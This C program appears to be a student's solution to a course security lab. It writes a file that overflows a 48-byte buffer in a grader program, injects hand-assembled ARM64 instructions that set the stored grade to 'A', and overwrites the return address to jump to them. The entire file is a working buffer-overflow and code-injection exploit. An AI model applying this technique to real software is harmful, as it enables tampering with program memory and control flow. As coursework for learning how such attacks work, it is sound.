/*
creates a file named dataA to manipulate the grader program to assign an 'A' grade.
the file includes:
1. the student's name followed by a null byte
2. padding to overflow the buffer
3. machine instructions to set the grade to 'A'
4. an overwritten return address directing execution to the injected instructions
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/*
main function behavior:
- accepts no command-line arguments
- does not read from stdin
- does not write to stdout or stderr (except on failure)
- writes crafted bytes to "dataA" file
- returns 0 on success, non-zero on failure
*/
int main(void) {
    /* student name, truncated to avoid newline characters */
    const char *studentName = "Anish";
    /* ASCII value for 'A' */
    const unsigned int asciiA = 0x41;

    /* predefined memory addresses based on memory map analysis */
    unsigned long gradeAddress = 0x420044;         /* address of the grade variable */
    unsigned long injectedCodeAddress = 0x42007c;  /* address where injected instructions reside */
    unsigned long returnJumpAddress = 0x40089c;     /* address to jump back after injection */

    /* generate machine instructions */
    unsigned int movInstruction = MiniAssembler_mov(0, asciiA);                           /* mov w0, #A */
    unsigned int adrInstruction = MiniAssembler_adr(1, gradeAddress, injectedCodeAddress + 4); /* adr x1, gradeAddress */
    unsigned int strbInstruction = MiniAssembler_strb(0, 1);                            /* strb w0, [x1] */
    unsigned int branchInstruction = MiniAssembler_b(returnJumpAddress, injectedCodeAddress + 12); /* b returnJumpAddress */

    /* open dataA file in binary write mode */
    FILE *filePtr = fopen("dataA", "wb");
    if (!filePtr) {
        return 1; /* exit if file cannot be opened */
    }

    /* write the student's name */
    fwrite(studentName, 1, 5, filePtr); /* "Anish" is 5 bytes */

    /* append a null byte to terminate the name string */
    fputc('\0', filePtr);

    /* add padding to overflow the buffer (total buffer size 48 bytes) */
    for (int byteCount = 0; byteCount < (48 - 6); byteCount++) { /* 5 name bytes + 1 null */
        fputc('\0', filePtr);
    }

    /* insert the crafted machine instructions */
    fwrite(&movInstruction, sizeof(movInstruction), 1, filePtr);          /* mov w0, #A */
    fwrite(&adrInstruction, sizeof(adrInstruction), 1, filePtr);          /* adr x1, gradeAddress */
    fwrite(&strbInstruction, sizeof(strbInstruction), 1, filePtr);       /* strb w0, [x1] */
    fwrite(&branchInstruction, sizeof(branchInstruction), 1, filePtr);    /* b returnJumpAddress */

    /* overwrite the return address to point to injected instructions */
    unsigned long fakeReturnAddress = injectedCodeAddress;
    fwrite(&fakeReturnAddress, sizeof(fakeReturnAddress), 1, filePtr);

    /* close the file after writing all data */
    fclose(filePtr);

    return 0; /* indicate successful execution */
}